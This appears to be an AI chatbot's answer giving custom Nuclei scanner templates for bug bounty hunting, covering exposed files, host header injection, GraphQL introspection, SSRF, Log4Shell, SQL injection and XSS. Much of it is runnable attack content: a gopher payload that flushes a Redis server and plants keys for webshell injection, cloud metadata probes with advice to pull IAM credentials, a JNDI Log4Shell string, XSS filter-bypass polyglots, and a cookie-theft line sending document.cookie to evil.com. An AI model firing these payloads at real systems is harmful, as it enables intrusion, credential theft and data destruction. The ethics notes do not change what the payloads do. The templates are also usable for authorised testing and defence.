### Custom Nuclei Templates in Bug Bounty Hunting

Nuclei, a fast YAML-based vulnerability scanner, excels in bug bounty hunting through its customizable templates. While the official repository (github.com/projectdiscovery/nuclei-templates) offers thousands of community-curated templates for common vulnerabilities like CVEs, misconfigurations, and exposures, custom templates allow hunters to target program-specific flaws, niche tech stacks, or emerging threats not covered in defaults. Custom templates are essential for automation, reducing false positives, and finding "hidden gems" in large scopes, leading to bounties from $500 (low-impact) to $10,000+ (critical). Below, I outline common uses and examples of custom templates in bug hunting, drawn from real-world guides, write-ups, and community shares. These are not exhaustive ("all" is impractical due to endless variations), but represent key patterns.

#### Why Use Custom Templates in Bug Hunting?
- **Customization**: Tailor to a program's tech (e.g., GraphQL, Next.js) or unique endpoints, avoiding over-hunted defaults.
- **Automation**: Chain with recon tools (e.g., subfinder + httpx) for workflows like subdomain scanning + vuln checks.
- **Efficiency**: Focus on high-impact vulns (e.g., SSRF, IDOR) with low noise; integrate into scripts for large scopes.
- **Real-World Impact**: Hunters report finding bugs like exposed .env files or host header injections leading to bounties.
- **Tools for Management**: Use repos like recon-ninja for storing/running customs, or AI-assisted validation.

#### Common Uses and Examples of Custom Templates
Custom templates typically involve HTTP requests, matchers (e.g., regex, status codes), and extractors. Save as .yaml files and run via `nuclei -u target.com -t custom.yaml`. Here are key categories with examples adapted from bug bounty write-ups and guides.

1. **Misconfigurations and Exposures (e.g., Exposed Files/Endpoints)**
   - **Use**: Scan for leaked configs, backups, or sensitive files in recon phase; common in VDPs or startup programs.
   - **Example Template** (Exposed .env):
     ```yaml:disable-run
     id: env-exposure
     info:
       name: Exposed .env File
       author: custom-hunter
       severity: high
       tags: misconfig, exposure
     http:
       - method: GET
         path:
           - "{{BaseURL}}/.env"
         matchers:
           - type: word
             words:
               - "DB_PASSWORD="
               - "API_KEY="
             condition: or
           - type: status
             status:
               - 200
     ```
   - **How to Use**: Pipe recon output: `cat live-subs.txt | nuclei -t env-exposure.yaml -o results.txt`. Validate manually for creds; report as info disclosure.

2. **Host Header Injection**
   - **Use**: Detect poisoning or redirects via manipulated headers; escalates to SSRF/XSS in bug chains.
   - **Example Template**:
     ```yaml
     id: host-header-injection
     info:
       name: Host Header Injection
       author: custom-hunter
       severity: medium
       tags: injection, header
     http:
       - method: GET
         path:
           - "{{BaseURL}}"
         headers:
           Host: "{{interactsh-url}}"
         matchers:
           - type: word
             part: body
             words:
               - "{{interactsh-url}}"
     ```
   - **How to Use**: Integrate with Burp Collaborator for OOB; run on APIs. Chain with open redirects for bounties.

3. **GraphQL Introspection**
   - **Use**: Check for enabled introspection leaking schemas; useful in API-heavy programs (e.g., fintech).
   - **Example Template**:
     ```yaml
     id: graphql-introspection
     info:
       name: GraphQL Introspection Enabled
       author: custom-hunter
       severity: medium
       tags: graphql, misconfig
     http:
       - method: POST
         path:
           - "{{BaseURL}}/graphql"
         headers:
           Content-Type: application/json
         body: '{"query": "query { __schema { types { name } } }"}'
         matchers:
           - type: word
             words:
               - "__schema"
               - "types"
             condition: and
           - type: status
             status:
               - 200
     ```
   - **How to Use**: Target /graphql endpoints from Gau output; escalate to BOLA if schema exposes sensitive queries.

4. **SSRF Detection**
   - **Use**: Probe for blind/full SSRF in URL params; high-reward in cloud-based targets.
   - **Example Template** (Basic SSRF):
     ```yaml
     id: basic-ssrf
     info:
       name: Basic SSRF Vulnerability
       author: custom-hunter
       severity: high
       tags: ssrf
     http:
       - method: GET
         path:
           - "{{BaseURL}}?url={{interactsh-url}}"
         matchers:
           - type: dsl
             dsl:
               - "contains(interactsh_protocol, 'http')"
     ```
   - **How to Use**: Use interact.sh for callbacks; chain with cloud metadata (e.g., AWS 169.254.169.254).

5. **Open Redirects**
   - **Use**: Find redirect params for phishing or SSRF pivots; low-hanging fruit in auth flows.
   - **Example Template**:
     ```yaml
     id: open-redirect
     info:
       name: Open Redirect
       author: custom-hunter
       severity: low
       tags: redirect
     http:
       - method: GET
         path:
           - "{{BaseURL}}/redirect?url=http://evil.com"
         matchers:
           - type: redirect
             redirect:
               - "http://evil.com"
     ```
   - **How to Use**: Scan login/logout endpoints; report if chains to higher impact.

6. **CVE-Specific (e.g., Log4Shell)**
   - **Use**: Target known CVEs in outdated software; automate for large scopes.
   - **Example Template** (Adapted for Log4j):
     ```yaml
     id: log4shell
     info:
       name: Log4Shell Detection
       author: custom-hunter
       severity: critical
       tags: cve, log4j
     http:
       - method: GET
         path:
           - "{{BaseURL}}?param=${jndi:ldap://{{interactsh-url}}}"
         matchers:
           - type: dsl
             dsl:
               - "contains(interactsh_protocol, 'dns')"
     ```
   - **How to Use**: Run on Java-based targets; confirm with manual exploit.

7. **Fuzzing for Injections (e.g., SQLi/XSS)**
   - **Use**: Fuzz params for injections; useful in black-box testing.
   - **Example Template** (SQLi Fuzz):
     ```yaml
     id: sqli-fuzz
     info:
       name: SQL Injection Fuzzing
       author: custom-hunter
       severity: high
       tags: injection, sql
     http:
       - method: GET
         path:
           - "{{BaseURL}}/search?q={{fuzz}}"
         payloads:
           fuzz: payloads/sqli.txt
         matchers:
           - type: word
             words:
               - "syntax error"
               - "unexpected end of file"
             condition: or
     ```
   - **How to Use**: Create payloads/sqli.txt with common injections; validate positives manually.

#### Advanced Workflows and Tips
- **Chaining Templates**: Use Nuclei workflows for multi-step (e.g., open-redirect.yaml + ssrf.yaml).
  ```yaml
  id: redirect-ssrf-chain
  info:
    name: Open Redirect to SSRF
    severity: high
  workflow:
    - template: open-redirect.yaml
    - template: basic-ssrf.yaml
  ```
- **Integration**: Automate with scripts (e.g., bash for recon + Nuclei); use in collaboration for large targets.
- **Community Shares**: Hunters share private collections (90+ templates) for $$$; focus on client-side bugs like prototype pollution.
- **Best Practices**: Test on VDPs first; minimize threads/rate-limits to avoid bans; contribute to nuclei-templates.

For more, explore GitHub forks or YouTube tutorials on creating customs. If you need a specific template customized, provide details!

---

### Advanced SSRF Nuclei Templates for Bug Bounty Hunting

Server-Side Request Forgery (SSRF) is a high-impact vulnerability in bug bounty programs, often leading to critical findings like internal network access, cloud metadata theft, or RCE chains. Nuclei's YAML templates excel at automating SSRF detection, especially advanced variants involving blinds, bypasses, protocol smuggling, and cloud-specific exploits. While the official Nuclei repository includes basic SSRF templates (e.g., blind-ssrf.yaml for OOB checks), custom advanced templates allow tailoring to program scopes, reducing duplicates, and targeting emerging threats like those in AWS/GCP metadata or Redis exploitation.

Below are custom advanced SSRF templates inspired by real-world methodologies, including cloud metadata probing, blind OOB, protocol smuggling (e.g., gopher for Redis), IP obfuscation bypasses, and chaining with open redirects. These use Nuclei's HTTP requests, matchers (e.g., DSL for OOB), and interact.sh integration for callbacks. Save as .yaml files and run via `nuclei -u http://target.com -t template.yaml -rl 10` (adjust rate limit for ethics). Always validate findings manually (e.g., with Burp Collaborator) and respect program rules to avoid bans.

#### 1. **Blind SSRF with OOB Detection**
   - **Use Case**: Detects blind SSRF where no response is echoed, but side effects (e.g., DNS/HTTP callbacks) confirm exploitation. Ideal for API params like `?url=` in cloud-heavy programs.
   - **Template** (blind-ssrf-oob.yaml):
     ```yaml:disable-run
     id: blind-ssrf-oob
     info:
       name: Blind SSRF with OOB Callback
       author: custom-hunter
       severity: high
       tags: ssrf, blind, oob
     http:
       - method: GET
         path:
           - "{{BaseURL}}?url={{interactsh-url}}"
         matchers:
           - type: dsl
             dsl:
               - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
     ```
   - **How It Works**: Sends a request to your interact.sh domain; matches on callback protocols. In bug bounty, chain with internal port scanning (e.g., modify path to `?url=127.0.0.1:{{port}}` in a fuzzed version). Payout potential: $2,000+ for confirmed internal access.

#### 2. **Cloud Metadata SSRF (AWS/GCP/Azure)**
   - **Use Case**: Probes for SSRF accessing cloud instance metadata, common in misconfigured AWS/GCP/Azure-hosted apps. High-reward in enterprise programs.
   - **Template** (cloud-metadata-ssrf.yaml):
     ```yaml
     id: cloud-metadata-ssrf
     info:
       name: Cloud Metadata SSRF (AWS/GCP/Azure)
       author: custom-hunter
       severity: critical
       tags: ssrf, cloud, metadata
     http:
       - method: GET
         path:
           - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/"  # AWS
           - "{{BaseURL}}?url=http://169.254.169.254/computeMetadata/v1/"  # GCP
           - "{{BaseURL}}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
         matchers:
           - type: word
             words:
               - "ami-id"  # AWS
               - "project-id"  # GCP
               - "vmId"  # Azure
             condition: or
           - type: status
             status:
               - 200
     ```
   - **How It Works**: Tests multiple cloud endpoints; matches on provider-specific keywords. Escalate by extracting creds (e.g., add `/iam/security-credentials/` for AWS). Use in recon after identifying cloud-hosted subdomains.

#### 3. **Protocol Smuggling SSRF (Gopher for Redis RCE)**
   - **Use Case**: Exploits non-HTTP protocols like gopher for smuggling commands to internal services (e.g., Redis), leading to RCE. Advanced for database-exposed targets.
   - **Template** (gopher-redis-ssrf.yaml):
     ```yaml
     id: gopher-redis-ssrf
     info:
       name: Gopher Protocol SSRF for Redis RCE
       author: custom-hunter
       severity: critical
       tags: ssrf, gopher, redis, rce
     http:
       - method: GET
         path:
           - "{{BaseURL}}?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2420%0D%0A%0A%0Aevil-payload%0A%0A%0D%0A"
         matchers:
           - type: word
             words:
               - "OK"
               - "CONFIG"
             condition: or
     ```
   - **How It Works**: Uses URL-encoded gopher payload to flush and set Redis keys (e.g., for webshell injection). Test on apps supporting custom protocols; confirm RCE manually. Bounty tip: Chain with subdomain enum for internal Redis instances.

#### 4. **SSRF Bypass with IP Obfuscation**
   - **Use Case**: Bypasses blacklists/whitelists using alternative IP formats (decimal, hex, etc.). Useful against filtered loopback/internal IPs.
   - **Template** (ssrf-bypass-obfuscation.yaml):
     ```yaml
     id: ssrf-bypass-obfuscation
     info:
       name: SSRF Bypass with IP Obfuscation
       author: custom-hunter
       severity: high
       tags: ssrf, bypass, obfuscation
     http:
       - method: GET
         path:
           - "{{BaseURL}}?url=http://2130706433/"  # Decimal 127.0.0.1
           - "{{BaseURL}}?url=http://0x7f000001/"  # Hex 127.0.0.1
           - "{{BaseURL}}?url=http://0177.0.0.1/"  # Octal 127.0.0.1
         matchers:
           - type: word
             words:
               - "localhost"
               - "internal"
             condition: or
           - type: status
             status:
               - 200
               - 302
     ```
   - **How It Works**: Tests obfuscated IPs for loopback access; matches on internal indicators. In bounties, combine with DNS rebinding tools like rbndr for dynamic bypasses.

#### 5. **Chained SSRF with Open Redirect**
   - **Use Case**: Chains SSRF with open redirects for pivoting to internals, escalating low-impact redirects to critical SSRF.
   - **Template** (chained-redirect-ssrf.yaml):
     ```yaml
     id: chained-redirect-ssrf
     info:
       name: Open Redirect to SSRF Chain
       author: custom-hunter
       severity: high
       tags: ssrf, redirect, chain
     workflow:
       - template: http/misconfiguration/open-redirect.yaml  # Assume base template exists
       - template: http/ssrf/basic-ssrf.yaml
     matchers:
       - type: dsl
         dsl:
           - "contains(body, 'redirected') && contains(body, 'internal')"
     ```
   - **How It Works**: Uses Nuclei workflows to first detect redirects, then chain to SSRF probes. Customize with program-specific paths; report as chained vuln for higher bounties.

#### Tips for Using These in Bug Bounty
- **Workflow Integration**: Pipe recon (e.g., `subfinder -d target.com | httpx -silent | nuclei -t ssrf-templates/`) for automated scans.
- **Optimization**: Add `-c 20 -rl 50` for speed; use interact.sh for OOB to avoid false positives.
- **Validation & Reporting**: Confirm with manual tools (e.g., SSRFmap); include Nuclei output, PoC requests, and impact (e.g., "Exposed AWS creds leading to account takeover").
- **Ethical Notes**: Test only in-scope; start with VDPs to refine.

For more, check community repos or adapt these for specific programs. If you need a template customized for a target, provide details!

---

### Custom Nuclei Templates for XSS Detection in Bug Bounty Hunting

Cross-Site Scripting (XSS) remains a high-value vulnerability in bug bounty programs due to its potential for session theft, phishing, or account takeover, with bounties ranging from $500 to $10,000+ depending on impact (e.g., stored XSS with GDPR implications). Nuclei’s YAML-based templates are ideal for automating XSS detection across reflected, stored, and DOM-based variants, especially when tailored to program-specific endpoints or tech stacks. While the official Nuclei template repository (github.com/projectdiscovery/nuclei-templates) includes XSS templates, custom templates allow hunters to target unique input fields, bypass filters, and reduce false positives in large scopes.

Below are advanced custom Nuclei templates for detecting XSS vulnerabilities, designed for bug bounty hunting. These focus on reflected, stored, DOM-based XSS, and filter bypasses, with examples inspired by real-world methodologies and community practices. Save each as a .yaml file and run with `nuclei -u http://target.com -t xss-template.yaml -rl 10` (adjust rate limit for ethics). Always validate findings manually with Burp Suite and report responsibly within program scopes.

<xaiArtifact artifact_id="524778c9-12bf-4f54-8a7b-1003093a5ba9" artifact_version_id="c2c69c97-590e-4cca-b11c-4dd0b5192e41" title="xss_templates.yaml" contentType="text/yaml">
# Template 1: Reflected XSS in URL Parameters
id: reflected-xss
info:
  name: Reflected XSS in URL Parameters
  author: custom-hunter
  severity: medium
  tags: xss, reflected
http:
  - method: GET
    path:
      - "{{BaseURL}}?q={{xss}}"
      - "{{BaseURL}}?search={{xss}}"
      - "{{BaseURL}}?query={{xss}}"
    payloads:
      xss:
        - "<script>alert(1)</script>"
        - "javascript:alert(1)"
        - "\" onmouseover=\"alert(1)\""
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"
          - "javascript:alert(1)"
          - "onmouseover=\"alert(1)\""
        condition: or
      - type: status
        status:
          - 200

# Template 2: Stored XSS in Forms
id: stored-xss-form
info:
  name: Stored XSS in Form Inputs
  author: custom-hunter
  severity: high
  tags: xss, stored
http:
  - method: POST
    path:
      - "{{BaseURL}}/comment"
      - "{{BaseURL}}/profile/update"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "comment={{xss}}&name=test"
    payloads:
      xss:
        - "<script>alert(document.cookie)</script>"
        - "<img src=x onerror=alert(1)>"
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.cookie)</script>"
          - "onerror=alert(1)"
        condition: or
      - type: status
        status:
          - 200
          - 302
  - method: GET
    path:
      - "{{BaseURL}}/comments"
      - "{{BaseURL}}/profile"
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.cookie)</script>"
          - "onerror=alert(1)"
        condition: or

# Template 3: DOM-Based XSS
id: dom-xss
info:
  name: DOM-Based XSS Detection
  author: custom-hunter
  severity: medium
  tags: xss, dom
http:
  - method: GET
    path:
      - "{{BaseURL}}#{{xss}}"
      - "{{BaseURL}}?hash={{xss}}"
    payloads:
      xss:
        - "javascript:alert(1)"
        - "<svg/onload=alert(1)>"
    matchers:
      - type: regex
        part: body
        regex:
          - "document\.write\(.*javascript:alert\(1\)"
          - "eval\(.*<svg/onload=alert\(1\)\)"
        condition: or
      - type: status
        status:
          - 200

# Template 4: XSS Filter Bypass
id: xss-filter-bypass
info:
  name: XSS Filter Bypass with Obfuscation
  author: custom-hunter
  severity: high
  tags: xss, bypass
http:
  - method: GET
    path:
      - "{{BaseURL}}?q={{xss}}"
      - "{{BaseURL}}?search={{xss}}"
    payloads:
      xss:
        - "<scr%00ipt>alert(1)</scr%00ipt>"
        - "onmouseover=\"alert(1)\""
        - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='alert(1)'"
    matchers:
      - type: word
        part: body
        words:
          - "<scr%00ipt>alert(1)</scr%00ipt>"
          - "onmouseover=\"alert(1)\""
          - "<svg/onload='alert(1)'"
        condition: or
      - type: status
        status:
          - 200

# Template 5: Blind XSS with OOB
id: blind-xss-oob
info:
  name: Blind XSS with OOB Callback
  author: custom-hunter
  severity: high
  tags: xss, blind, oob
http:
  - method: POST
    path:
      - "{{BaseURL}}/feedback"
      - "{{BaseURL}}/contact"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "message=<script src=\"{{interactsh-url}}\"></script>&name=test"
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'http')"
</xaiArtifact>

---

### How to Use These Templates in Bug Bounty

1. **Setup and Run**:
   - Save the artifact as `xss_templates.yaml` in your Nuclei templates directory (e.g., `~/custom-nuclei/xss_templates.yaml`).
   - Run on a single target: `nuclei -u http://target.com -t xss_templates.yaml -rl 10`.
   - Integrate with recon: `subfinder -d target.com | httpx -silent | nuclei -t xss_templates.yaml -o xss_results.txt`.
   - Use `-silent` for cleaner output or `-jsonl` for parsing.

2. **Key Features of Each Template**:
   - **Reflected XSS**: Targets URL parameters (e.g., `?q=`, `?search=`) common in search bars or redirects; matches on payload reflection.
   - **Stored XSS**: Tests form inputs (e.g., comments, profiles) for persistent script execution; includes follow-up GET to verify storage.
   - **DOM-Based XSS**: Probes fragment-based inputs (e.g., `#hash`) for client-side script execution via `document.write` or `eval`.
   - **Filter Bypass**: Uses obfuscated payloads to evade WAFs or sanitizers (e.g., null bytes, polyglots).
   - **Blind XSS**: Sends payloads to forms (e.g., feedback) and uses interact.sh for OOB callbacks, ideal for admin panels.

3. **Workflow Integration**:
   - **Recon**: Gather endpoints with `gau target.com --subs > urls.txt`; filter for params like `q`, `search`.
   - **Scan**: Run `cat urls.txt | nuclei -t xss_templates.yaml -severity medium,high`.
   - **Validate**: Use Burp Suite to manually test positive hits (e.g., confirm `<script>alert(1)</script>` executes). Escalate with PoCs like cookie theft (`document.location='http://evil.com?cookie='+document.cookie`).
   - **Optimize**: Adjust `-c 20` (threads) and `-rl 50` (rate limit) to avoid bans; test on VDPs first.

4. **Reporting**:
   - Extract results: Parse `xss_results.txt` or JSON output.
   - Confirm manually: Reproduce in browser or Burp; record video/screenshots.
   - Report format:
     ```markdown:disable-run
     # Stored XSS in Comment Section
     **Severity**: High (CVSS 7.5)
     **Description**: Stored XSS in comment form allows script execution for all viewers.
     **Steps**:
     1. POST `<script>alert(document.cookie)</script>` to http://target.com/comment.
     2. Visit http://target.com/comments; observe cookie alert.
     **PoC**: [Video link]
     **Impact**: Session theft, account takeover.
     **Fix**: Sanitize inputs with DOMPurify; add CSP.
     ```
   - Submit via program’s platform (e.g., HackerOne); include Nuclei command used.

5. **Advanced Tips**:
   - **Chaining**: Combine with CSRF or IDOR templates for higher impact (e.g., XSS to steal admin cookies).
   - **Custom Payloads**: Create a `payloads/xss.txt` file with advanced polyglots (e.g., `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'`); reference in templates.
   - **Target-Specific**: Tailor paths (e.g., `/graphql`, `/api`) using Wappalyzer to match program’s stack.
   - **Community Learning**: Check X for `#nuclei xss` or nuclei-templates PRs for new payloads.
   - **Ethics**: Test only in-scope assets; avoid excessive requests.

---

### Practical Example
- **Target**: `example.com` (HackerOne public program).
- **Workflow**:
  1. Recon: `subfinder -d example.com | httpx -silent | gau --subs > urls.txt`.
  2. Scan: `cat urls.txt | nuclei -t xss_templates.yaml -o xss_results.txt`.
  3. Validate: Find reflected XSS in `http://example.com/search?q=<script>alert(1)</script>`; confirm in Burp.
  4. Report: Submit with PoC video, showing alert and cookie theft potential.

---

### Notes
- **False Positives**: Nuclei may flag non-executable reflections; always verify script execution in browser.
- **Scope**: Customize paths/params for program (e.g., add `/forum/post` for forums).
- **Practice**: Test on PortSwigger labs or VDPs like Open Bug Bounty.

If you need a specific XSS template customized (e.g., for a CMS or API) or a workflow script integrating these, let me know! I can also search X for recent XSS-related Nuclei tips if desired.

---

